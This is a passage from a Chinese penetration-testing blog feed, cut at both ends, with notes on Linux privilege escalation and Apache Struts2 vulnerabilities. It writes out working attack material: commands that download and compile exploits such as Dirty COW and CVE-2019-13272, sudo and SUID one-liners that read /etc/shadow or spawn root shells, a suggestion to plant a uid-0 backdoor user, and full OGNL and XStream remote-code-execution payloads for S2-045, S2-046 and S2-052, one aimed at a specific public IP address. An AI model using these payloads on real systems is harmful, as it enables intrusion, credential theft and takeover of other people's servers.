class="hljs-regexp">/fulldisclosure/</span><br>https:<span class="hljs-regexp">//</span>exploit.kitploit.com/<br>https:<span class="hljs-regexp">//</span>www.cvedetails.com/index.php<br>https:<span class="hljs-regexp">//</span>packetstormsecurity.com/<br>http:<span class="hljs-regexp">//</span>cve.mitre.org<span class="hljs-regexp">/cve/</span>search_cve_list.html<br>https:<span class="hljs-regexp">//</span>www.anquanke.com/vul<br>https:<span class="hljs-regexp">//</span>nvd.nist.gov<span class="hljs-regexp">/vuln/</span>categories<br></code></pre></td></tr></table></figure></li><li><p>searchsploit</p><p>这个可以搜索相关的exp</p><p>现在尝试使用</p><p>使用grep 过滤相关的内容</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">searchsploit privilege | <span class="hljs-type">grep</span> -i linux | <span class="hljs-type">grep</span> -i kernel<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240212162428567.png" alt="image-20240212162428567"></p><p>然后选择需要的exp 使用-p 得到详细的path</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240212162556800.png" alt="image-20240212162556800"></p><p>然后就可以就可以通过编译或者其他方式利用</p><p>使用选项-w 就是通过联网搜索</p></li></ol><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="脏牛提权漏洞"><a href="#脏牛提权漏洞" class="headerlink" title="脏牛提权漏洞"></a>脏牛提权漏洞</h3><p>漏洞名称：脏牛（Dirty COW）  </p><p>漏洞危害：低权限用户利用该漏洞技术可以在全版本 Linux 系统上实现本地提权  </p><p>影响范围：Linux 内核2.6.22 &lt; 3.9 (x86&#x2F;x64)  </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">POC： https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/FireFart/</span>dirtycow<br><br>gcc编译： gcc -pthread ditry.c -o dirty -lcrypt<br><br>替换root用户： ./dirty password<br></code></pre></td></tr></table></figure><p>现在模拟一下利用</p><p>查看系统版本</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240212173357241.png" alt="image-20240212173357241"></p><p>下载好的poc 进行编译</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240212173502598.png" alt="image-20240212173502598"></p><p>现在测试是否创建才成功</p><p>首先使用root 用户创建一个只读文件</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240212173807751.png" alt="image-20240212173807751"></p><p>使用脚本</p><p>然后等待一会之后</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240212173945552.png" alt="image-20240212173945552"></p><p>执行完成</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240212174006323.png" alt="image-20240212174006323"></p><h3 id="CVE-2019-13272"><a href="#CVE-2019-13272" class="headerlink" title="CVE-2019-13272"></a>CVE-2019-13272</h3><p>这个直接使用searchsploit </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">exploitdb：<br>https:<span class="hljs-regexp">//</span>www.exploit-db.com<span class="hljs-regexp">/exploits/</span><span class="hljs-number">47163</span><br>利用exp：<br>https:<span class="hljs-regexp">//</span>www.exploit-db.com<span class="hljs-regexp">/download/</span><span class="hljs-number">47163</span><br></code></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">wget <span class="hljs-keyword">https</span>://www.exploit-db.com/download/<span class="hljs-number">47163</span> -O <span class="hljs-built_in">exp</span>.c<br>gcc <span class="hljs-built_in">exp</span>.c –o <span class="hljs-built_in">exp</span><br>./<span class="hljs-built_in">exp</span><br><br></code></pre></td></tr></table></figure><h3 id="CVE-2019-7304"><a href="#CVE-2019-7304" class="headerlink" title="CVE-2019-7304"></a>CVE-2019-7304</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/initstring/</span>dirty_sock<br></code></pre></td></tr></table></figure><h3 id="CVE-2021-3493"><a href="#CVE-2021-3493" class="headerlink" title="CVE-2021-3493"></a>CVE-2021-3493</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/briskets/</span>CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">3493</span><br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">gcc exploit.c -o <span class="hljs-built_in">exp</span><br>./<span class="hljs-built_in">exp</span><br></code></pre></td></tr></table></figure><h2 id="Linux密码Hash"><a href="#Linux密码Hash" class="headerlink" title="Linux密码Hash"></a>Linux密码Hash</h2><ul><li><p>&#x2F;etc&#x2F;passwd  </p><p> 所有用户都可以查看，存储着所有用户的信息，每一行代表一个用户，每一行通过冒号:分为七个部分  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240213100626279.png" alt="image-20240213100626279"></p><p>此文件必须使用管理员权限</p><p>可以查看到有一些是不能登录的，也就是nologin</p><blockquote><ol><li>用户名  </li><li>密码，x表示密码保存在&#x2F;etc&#x2F;shadow  </li><li>UID，0代表root  </li><li>GID，表示所在组  </li><li>描述信息，依次为Full Name、Room Number、Work Phone、Home Phone和Other  </li><li>用户主目录  </li><li>默认shell类型</li></ol></blockquote><p>我们可以查看到root 用户的uid  和 gid </p><p>我们就可以尝试创建一个uid gid和root 一样的一个用户，这样这个用户就拥有了对应的权限，也可以称为 后门用户</p><p>而可以通过密码处不为x 的，尝试解密就可以得到对应的账号和权限了</p><blockquote><p><a href="https://cmd5.com/">https://cmd5.com/</a>  </p><p><a href="https://www.somd5.com/">https://www.somd5.com/</a></p></blockquote></li><li><p>&#x2F;etc&#x2F;shadow</p></li></ul><p>  只有root用户能够查看，保存加密后的密码和用户相关密码信息，每个用户一行，每一行通过冒号:分为九个部分：  </p><blockquote><ol><li><p>用户名  </p></li><li><p>加密后的密码  </p></li><li><p>上次修改密码的时间(从1970.1.1开始的总天数)  </p></li><li><p>两次修改密码间隔的最少天数，如果为0，则没有限制  </p></li><li><p>两次修改密码间隔最多的天数,表示该用户的密码会在多少天后过期，如果为99999则没有限制提  </p></li><li><p>前多少天警告用户密码将过期  </p></li><li><p>在密码过期之后多少天禁用此用户  </p></li><li><p>用户过期日期(从1970.1.1开始的总天数)，如果为0，则该用户永久可用  </p></li><li><p>保留</p></li></ol></blockquote><h2 id="滥用的SUDO权限"><a href="#滥用的SUDO权限" class="headerlink" title="滥用的SUDO权限"></a>滥用的SUDO权限</h2><p>sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具。  </p><blockquote><p><a href="https://www.runoob.com/linux/linux-comm-sudo.html">https://www.runoob.com/linux/linux-comm-sudo.html</a>  </p><p><a href="https://blog.csdn.net/netlai/article/details/79727187">https://blog.csdn.net/netlai/article/details/79727187</a>  </p></blockquote><p>sudo配置文件：&#x2F;etc&#x2F;sudoers  配置文件权限：0440 </p><p>如果获取了普通用户并且配置了sudo 我们就可以直接使用sudo 打开一个bash 那么这个就是root 权限的账号了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240213102140755.png" alt="image-20240213102140755"></p><p>sudo -l：显示出自己(执行sudo的使用者)的权限  </p><p><img src="D:\hexo\source_posts\渗透\操作系统提权.assets\image-20240213102419005.png" alt="image-20240213102419005"></p><p>sudo –s：执行环境变数中的shell所指定的shell，或是&#x2F;etc&#x2F;passwd 里所指定的shell  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240213102609771.png" alt="image-20240213102609771"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240213102639241.png" alt="image-20240213102639241"></p><ul><li><p>sudo 提权</p><blockquote><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>  </p></blockquote><p>这个网站收集了所有的指令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo /bin/ash<br>sudo /usr/bin/awk -F: ‘&#123;<span class="hljs-built_in">print</span> <span class="hljs-variable">$1</span> <span class="hljs-variable">$2</span>&#125;<span class="hljs-string">&#x27; /etc/shadow</span><br><span class="hljs-string">sudo /usr/bin/awk &#x27;</span>BEGIN &#123;system(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#125;<span class="hljs-string">&#x27;</span><br><span class="hljs-string">sudo curl file:///etc/shadow</span><br><span class="hljs-string">sudo find . -exec /bin/sh \; -quit</span><br></code></pre></td></tr></table></figure></li><li><p>文件s 权限</p><p>也称为suid 权限，就是在文件的可执行权限处为s</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240213105025923.png" alt="image-20240213105025923"><br>进行提权</p><p>查找具有suid 权限的程序</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240213105341345.png" alt="image-20240213105341345"></p><p>使用find 举例子</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240213105405202.png" alt="image-20240213105405202"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">./find . -<span class="hljs-built_in">exec</span> /bin/sh -p \; -quit<br></code></pre></td></tr></table></figure><p>本质就是find 存在s（suid） 权限，然后也是属于root 的文件，那么我们使用find 的进程就是root 权限的。权限基于进程，使用root 的进程的子进程（使用bash或者sh）也是会继承该权限</p></li></ul><h2 id="提权工具"><a href="#提权工具" class="headerlink" title="提权工具"></a>提权工具</h2><ul><li>traitor</li></ul><p>  <a href="https://github.com/liamg/traitor">https://github.com/liamg/traitor</a></p><ul><li>gtfo</li></ul><p>  <a href="https://github.com/mzfr/gtfo">https://github.com/mzfr/gtfo</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/02/10/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/"/>
    <url>/2024/02/10/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="S2-045"><a href="#S2-045" class="headerlink" title="S2-045"></a>S2-045</h1><p>这个是一个rce 漏洞</p><p>0x00</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210215034104.png" alt="image-20240210215034104"></p><p>这是一个模拟的上传文件的一个页面</p><p>尝试上传文件，然后抓包</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210215148081.png" alt="image-20240210215148081"></p><p>修改content-type</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">Content-Type:<span class="hljs-string">&quot;%&#123;(<span class="hljs-subst">#nike</span>=&#x27;multipart/form-data&#x27;).(<span class="hljs-subst">#dm</span>=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(<span class="hljs-subst">#_memberAccess</span>?(<span class="hljs-subst">#_memberAccess</span>=<span class="hljs-subst">#dm</span>):((<span class="hljs-subst">#container</span>=<span class="hljs-subst">#context</span>[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(<span class="hljs-subst">#ognlUtil</span>=<span class="hljs-subst">#container</span>.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(<span class="hljs-subst">#ognlUtil</span>.getExcludedPackageNames().clear()).(<span class="hljs-subst">#ognlUtil</span>.getExcludedClasses().clear()).(<span class="hljs-subst">#context</span>.setMemberAccess(<span class="hljs-subst">#dm</span>)))).(<span class="hljs-subst">#cmd</span>=&#x27;whoami&#x27;).(<span class="hljs-subst">#iswin</span>=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(<span class="hljs-subst">#cmds</span>=(<span class="hljs-subst">#iswin</span>?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,<span class="hljs-subst">#cmd</span>&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,<span class="hljs-subst">#cmd</span>&#125;)).(<span class="hljs-subst">#p</span>=new java.lang.ProcessBuilder(<span class="hljs-subst">#cmds</span>)).(<span class="hljs-subst">#p</span>.redirectErrorStream(true)).(<span class="hljs-subst">#process</span>=<span class="hljs-subst">#p</span>.start()).(<span class="hljs-subst">#ros</span>=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(<span class="hljs-subst">#process</span>.getInputStream(),<span class="hljs-subst">#ros</span>)).(<span class="hljs-subst">#ros</span>.flush())&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>注意这个是一行</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210215442544.png" alt="image-20240210215442544"></p><p>发现顺利的返回结果</p><h1 id="S2-046"><a href="#S2-046" class="headerlink" title="S2_046"></a>S2_046</h1><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210215654668.png" alt="image-20240210215654668"></p><p>0x00</p><p>还是一样模仿的一个文件上传的界面</p><p>和上面的那个一样的，只是利用的地方不一样而已</p><p>还是抓包，然后修改filename</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210220414316.png" alt="image-20240210220414316"></p><p>发现利用成功</p><p>然后将 filename 修改为</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">%&#123;(#nike=<span class="hljs-string">&#x27;multipart/form-data&#x27;</span>).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="hljs-string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@<span class="hljs-keyword">class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=<span class="hljs-string">&#x27;id&#x27;</span>).(#iswin=(@java.lang.System@getProperty(<span class="hljs-string">&#x27;os.name&#x27;</span>).toLowerCase().contains(<span class="hljs-string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="hljs-string">&#x27;/bin/bash&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;b<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210220612371.png" alt="image-20240210220612371"></p><p>注意使用00截断一下</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210220843498.png" alt="image-20240210220843498"></p><p>发现利用成功</p><h1 id="S2-052"><a href="#S2-052" class="headerlink" title="S2_052"></a>S2_052</h1><p>由于线上的靶场开启的速度太慢了，所以还是使用本地的</p><p>0x00</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210221708111.png" alt="image-20240210221708111"></p><p>发现这个</p><p>0x01</p><p>直接使用payload </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/orders/3</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>120.26.80.77:8080<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>2063<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">map</span>&gt;</span> </span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span> </span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">flags</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">flags</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">value</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">dataHandler</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">is</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.crypto.CipherInputStream&quot;</span>&gt;</span></span><br><span class="language-xml">                            <span class="hljs-tag">&lt;<span class="hljs-name">cipher</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.crypto.NullCipher&quot;</span>&gt;</span></span><br><span class="language-xml">                                <span class="hljs-tag">&lt;<span class="hljs-name">initialized</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">initialized</span>&gt;</span></span><br><span class="language-xml">                                <span class="hljs-tag">&lt;<span class="hljs-name">opmode</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">opmode</span>&gt;</span></span><br><span class="language-xml">                                <span class="hljs-tag">&lt;<span class="hljs-name">serviceIterator</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.imageio.spi.FilterIterator&quot;</span>&gt;</span></span><br><span class="language-xml">                                    <span class="hljs-tag">&lt;<span class="hljs-name">iter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.imageio.spi.FilterIterator&quot;</span>&gt;</span></span><br><span class="language-xml">                                        <span class="hljs-tag">&lt;<span class="hljs-name">iter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.util.Collections$EmptyIterator&quot;</span>/&gt;</span></span><br><span class="language-xml">                                        <span class="hljs-tag">&lt;<span class="hljs-name">next</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="language-xml">                                            <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>touch<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/tmp/success<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml">                                            <span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span></span><br><span class="language-xml">                                            <span class="hljs-tag">&lt;<span class="hljs-name">redirectErrorStream</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">redirectErrorStream</span>&gt;</span></span><br><span class="language-xml">                                        <span class="hljs-tag">&lt;/<span class="hljs-name">next</span>&gt;</span></span><br><span class="language-xml">                                    <span class="hljs-tag">&lt;/<span class="hljs-name">iter</span>&gt;</span></span><br><span class="language-xml">                                    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.imageio.ImageIO$ContainsFilter&quot;</span>&gt;</span></span><br><span class="language-xml">                                        <span class="hljs-tag">&lt;<span class="hljs-name">method</span>&gt;</span></span><br><span class="language-xml">                                            <span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span></span><br><span class="language-xml">                                            <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml">                                            <span class="hljs-tag">&lt;<span class="hljs-name">parameter-types</span>/&gt;</span></span><br><span class="language-xml">                                        <span class="hljs-tag">&lt;/<span class="hljs-name">method</span>&gt;</span></span><br><span class="language-xml">                                        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml">                                    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span></span><br><span class="language-xml">                                    <span class="hljs-tag">&lt;<span class="hljs-name">next</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;string&quot;</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-name">next</span>&gt;</span></span><br><span class="language-xml">                                <span class="hljs-tag">&lt;/<span class="hljs-name">serviceIterator</span>&gt;</span></span><br><span class="language-xml">                                <span class="hljs-tag">&lt;<span class="hljs-name">lock</span>/&gt;</span></span><br><span class="language-xml">                            <span class="hljs-tag">&lt;/<span class="hljs-name">cipher</span>&gt;</span></span><br><span class="language-xml">                            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder$NullInputStream&quot;</span>/&gt;</span></span><br><span class="language-xml">                            <span class="hljs-tag">&lt;<span class="hljs-name">ibuffer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ibuffer</span>&gt;</span></span><br><span class="language-xml">                            <span class="hljs-tag">&lt;<span class="hljs-name">done</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">done</span>&gt;</span></span><br><span class="language-xml">                            <span class="hljs-tag">&lt;<span class="hljs-name">ostart</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">ostart</span>&gt;</span></span><br><span class="language-xml">                            <span class="hljs-tag">&lt;<span class="hljs-name">ofinish</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">ofinish</span>&gt;</span></span><br><span class="language-xml">                            <span class="hljs-tag">&lt;<span class="hljs-name">closed</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">closed</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;/<span class="hljs-name">is</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">consumed</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">consumed</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">transferFlavors</span>/&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">dataHandler</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">dataLen</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">dataLen</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&quot;../jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span></span><br><span 